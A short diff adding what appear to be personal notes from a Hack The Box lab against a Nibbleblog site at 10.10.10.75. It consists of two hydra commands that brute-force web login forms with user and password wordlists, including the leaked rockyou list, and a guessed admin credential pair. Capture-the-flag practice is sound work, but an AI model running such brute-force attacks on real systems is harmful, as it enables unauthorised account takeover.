@@ -1,0 +1,7 @@
+
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P wordlists/100-common-passwords.txt 192.21.41.3 http-get /
+http://10.10.10.75/nibbleblog/admin.php
+username=nibbleblog&password=1234
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /home/htb-woodenshoe/htb/wordlist/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.75 http-post-form “/nibbleblog/admin.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
